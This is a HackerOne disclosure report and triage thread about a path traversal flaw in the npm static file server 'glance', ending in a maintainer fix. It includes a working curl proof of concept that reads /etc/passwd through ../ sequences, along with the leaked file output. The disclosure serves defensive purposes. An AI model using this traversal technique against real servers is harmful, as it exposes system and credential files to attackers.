title: [glance] Path Traversal in glance static file server allows to read content of arbitrary file

profile.name: Node.js third-party modules
profile.about: This program is used to handle vulnerabilities in the Node.js ecosystem.

vulnerability_information:
Hi Guys,

There is Path Traversal vulnerability in ```glance``` module. This issue allows to read arbitrary files from the server, where ```glance``` is installed.

## Module

**glance**

a quick disposable http server for static files

https://www.npmjs.com/package/glance

Stats
33 downloads in the last day
34 downloads in the last week
269 downloads in the last month

~3000 estimated downloads per year

## Description

```glance``` serves files from the server where was installed. No path sanitization is implemented, thus malicious user is able to read content of any file from the server using simple ```curl``` command (adjust number of ../ to reflect your system):

```
curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd
```

The result:

```
me:~/playground/hackerone/Node$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /../../../../../../etc/passwd HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< content-type: application/octet-stream
< etag: 6d51e6677c898282619137b0c74f0cab
< last-modified: Fri, 26 Jan 2018 12:04:19 +0000
< content-length: 2559
< Date: Mon, 29 Jan 2018 10:23:45 GMT
< Connection: keep-alive
< 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
(..)
guest-cz1ton:x:999:999:Guest:/tmp/guest-cz1ton:/bin/bash
postgres:x:124:131:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
* Connection #0 to host 127.0.0.1 left intact
me:~/playground/hackerone/Node$
```

## Steps To Reproduce:

- install ```glance```:

```
$ npm install glance
```

- run ```glance``` in direcotry of your choice

```
me:~/playground/hackerone/Node$ ./node_modules/glance/bin/glance.js --verbose --dir ./node_modules/
glance serving node_modules/ on port 8080
::1 read node_modules/
::1 read node_modules/bash-color/
::1 read node_modules/bash-color/README.md
::1 read ./
::1 read malware_frame.html
::1 read malware.js
ERR404 ::ffff:127.0.0.1 on ../../../etc/passwd
ERR404 ::ffff:127.0.0.1 on ../../../../etc/passwd
::ffff:127.0.0.1 read ../../../../../etc/passwd
::ffff:127.0.0.1 read ../../../../../etc/passwd
```

You can see in the log above all my requests sent to ```glance```, including ```curl``` requests from PoC, where I was able to traverse directory tree and read content of ```/etc/passwd``` file

## Supporting Material/References:

- Ubuntu 16.04 LTS
- Chromium 66.0.3333.0 (Developer Build) (64-bit) 
- Node.js version: v8.9.4 LTS
- npm version: 5.6.0
- curl 7.47.0


Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.

I hope my report will help to keep Node.js ecosystem and its users safe in the future.

Regards,

Rafal 'bl4de' Janicki

## Impact

This vulnerability allows malicious user to read content of arbitrary file from the server.
vulnerability_information_html:
Hi Guys,

There is Path Traversal vulnerability in glance module. This issue allows to read arbitrary files from the server, where glance is installed.

Module

glance

a quick disposable http server for static files

https://www.npmjs.com/package/glance

Stats
33 downloads in the last day
34 downloads in the last week
269 downloads in the last month

~3000 estimated downloads per year

Description

glance serves files from the server where was installed. No path sanitization is implemented, thus malicious user is able to read content of any file from the server using simple curl command (adjust number of ../ to reflect your system):

curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd

The result:

me:~/playground/hackerone/Node$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /../../../../../../etc/passwd HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< content-type: application/octet-stream
< etag: 6d51e6677c898282619137b0c74f0cab
< last-modified: Fri, 26 Jan 2018 12:04:19 +0000
< content-length: 2559
< Date: Mon, 29 Jan 2018 10:23:45 GMT

<

Steps To Reproduce:

  • install glance:
$ npm install glance
  • run glance in direcotry of your choice
me:~/playground/hackerone/Node$ ./node_modules/glance/bin/glance.js --verbose --dir ./node_modules/
glance serving node_modules/ on port 8080
::1 read node_modules/
::1 read node_modules/bash-color/
::1 read node_modules/bash-color/README.md
::1 read ./
::1 read malware_frame.html
::1 read malware.js
ERR404 ::ffff:127.0.0.1 on ../../../etc/passwd
ERR404 ::ffff:127.0.0.1 on ../../../../etc/passwd
::ffff:127.0.0.1 read ../../../../../etc/passwd
::ffff:127.0.0.1 read ../../../../../etc/passwd

You can see in the log above all my requests sent to glance, including curl requests from PoC, where I was able to traverse directory tree and read content of /etc/passwd file

Supporting Material/References:

  • Ubuntu 16.04 LTS
  • Chromium 66.0.3333.0 (Developer Build) (64-bit)
  • Node.js version: v8.9.4 LTS
  • npm version: 5.6.0
  • curl 7.47.0

Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.

I hope my report will help to keep Node.js ecosystem and its users safe in the future.

Regards,

Rafal 'bl4de' Janicki

Impact

This vulnerability allows malicious user to read content of arbitrary file from the server.

activities.message:
Hi @bl4de, 

Thanks a lot for reporting this to us.
I quickly tried to reproduce your report but I'm hitting an error with the package:

```
./glance/node_modules/filed/main.js:33
  this.mimetype = options.mimetype || mime.lookup(this.path.slice(this.path.lastIndexOf('.')+1))
                                           ^

TypeError: mime.lookup is not a function
```
activities.markdown_message:
Hi @bl4de,

Thanks a lot for reporting this to us.
I quickly tried to reproduce your report but I'm hitting an error with the package:

./glance/node_modules/filed/main.js:33
  this.mimetype = options.mimetype || mime.lookup(this.path.slice(this.path.lastIndexOf('.')+1))
                                           ^

TypeError: mime.lookup is not a function

activities.message:
Hi @lirantal 

It seems that mime module was not installed in your ./node_modules folder.
All tests I am performed I start from removing old ./node_modules folder and install module I am going to test locally (without -g option) and then call tested module in this way:

$ ./node_modules/PACKAE_NAME/bin/EXECUTABLE --option1 value --option2 value


Or you can try install mime module, probably it has to be installed globally as well:
$ npm install -g mime
activities.markdown_message:
Hi @lirantal

It seems that mime module was not installed in your ./node_modules folder.
All tests I am performed I start from removing old ./node_modules folder and install module I am going to test locally (without -g option) and then call tested module in this way:

$ ./node_modules/PACKAE_NAME/bin/EXECUTABLE --option1 value --option2 value

Or you can try install mime module, probably it has to be installed globally as well:
$ npm install -g mime

activities.message:
I'm installing the module on a fresh new project locally, so nothing is installed globally. I did add the mime module just in case but same error. (we're on the same Node and npm versions).

The problem seems to be not with the mime module but the version it is using which maybe doesn't have the `lookup` function anymore... ?
activities.markdown_message:
I'm installing the module on a fresh new project locally, so nothing is installed globally. I did add the mime module just in case but same error. (we're on the same Node and npm versions).

The problem seems to be not with the mime module but the version it is using which maybe doesn't have the lookup function anymore... ?

activities.message:
Hmm, that's really weird. Just did it once again and it works fine :/ Here's what I've just done, command by command: ``` me:~/playground/hackerone/Node$ rm -rf node_modules/ me:~/playground/hackerone/Node$ npm install glance npm WARN saveError ENOENT: no such file or directory, open '/home/rafal.janicki/playground/hackerone/Node/package.json' npm WARN enoent ENOENT: no such file or directory, open '/home/rafal.janicki/playground/hackerone/Node/package.json' npm WARN Node No description npm WARN Node No repository field. npm WARN Node No README data npm WARN Node No license field. + glance@3.0.3 added 12 packages in 1.596s me:~/playground/hackerone/Node$ tree -L 1 node_modules/ node_modules/ ├── abbrev ├── bash-color ├── filed ├── glance ├── html-ls ├── ls-stream ├── mime ├── nopt ├── through ├── utils-fs-exists └── xtend 11 directories, 0 files me:~/playground/hackerone/Node$ ./node_modules/glance/bin/glance.js --verbose --dir ./node_modules/ glance serving node_modules/ on port 8080 ``` Works fine: ``` me:~/playground/hackerone/Node$ curl -v http://127.0.0.1:8080 * Rebuilt URL to: http://127.0.0.1:8080/ * Trying 127.0.0.1... * Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0) > GET / HTTP/1.1 > Host: 127.0.0.1:8080 > User-Agent: curl/7.47.0 > Accept: */* > < HTTP/1.1 200 OK < content-type: text/html;charset=utf-8 < Date: Mon, 29 Jan 2018 13:57:50 GMT < Connection: keep-alive < Transfer-Encoding: chunked <
  • .bin/
  • abbrev/
  • bash-color/
  • filed/
  • glance/
  • html-ls/
  • ls-stream/
  • mime/
  • nopt/
  • through/
  • utils-fs-exists/
  • xtend/
* Connection #0 to host 127.0.0.1 left intact me:~/playground/hackerone/Node$ ```

activities.message:
Sure, here you go:

```

└─┬ glance@3.0.3

activities.message:
@bl4de the difference is in the mime package version as I suspected, since in my install I get the following:

```
└─┬ glance@3.0.3
  ├── bash-color@0.0.3
  ├─┬ filed@0.1.0
  │ └── mime@2.2.0
  ├─┬ html-ls@1.0.0
  │ ├─┬ ls-stream@1.0.0
  │ │ └── through@2.2.7
  │ └── through@2.3.4
  ├─┬ nopt@3.0.4
  │ └── abbrev@1.1.1
  ├── utils-fs-exists@1.0.1
  └── xtend@4.0.0
```

And indeed 2.x breaks some features like that `lookup` function.
I will downgrade manually to mime 1.x and re-test.
activities.markdown_message:
@bl4de the difference is in the mime package version as I suspected, since in my install I get the following:

└─┬ glance@3.0.3
  ├── bash-color@0.0.3
  ├─┬ filed@0.1.0
  │ └── mime@2.2.0
  ├─┬ html-ls@1.0.0
  │ ├─┬ ls-stream@1.0.0
  │ │ └── through@2.2.7
  │ └── through@2.3.4
  ├─┬ nopt@3.0.4
  │ └── abbrev@1.1.1
  ├── utils-fs-exists@1.0.1
  └── xtend@4.0.0

And indeed 2.x breaks some features like that lookup function.
I will downgrade manually to mime 1.x and re-test.

activities.message:
I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.
I will invite the package maintainer to this issue.
activities.markdown_message:
I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.
I will invite the package maintainer to this issue.

activities.message: Thanks for contacting me about this issue. I [committed a fix](https://github.com/jarofghosts/glance/commit/8cfd88e44ebd3f07e3a2eaf376a3e758b6c4ca19) and have published glance@3.0.4 that includes this fix. I have also `npm deprecate`d all versions below 3.0.4 with a note that that version fixes said vulnerability.
activities.markdown_message: Thanks for contacting me about this issue. I committed a fix and have published glance@3.0.4 that includes this fix. I have also npm deprecated all versions below 3.0.4 with a note that that version fixes said vulnerability.

activities.message:
Hi @jarofghosts 

Thanks for quick response.
Pretty neat fix! :) 

@lirantal  - I can't reproduce issue anymore. Looks resolved to me.

bl4de

Thanks for quick response.
Pretty neat fix! :)

bl4de

activities.message:
Great! Thanks for the quick response on this @jarofghosts and for validating @bl4de!

are you both ok with a full public disclosure for this report? we'll publicly disclose it within 45 days since it was triaged per the policy (https://github.com/nodejs/security-wg/blob/master/processes/third_party_vuln_process.md)
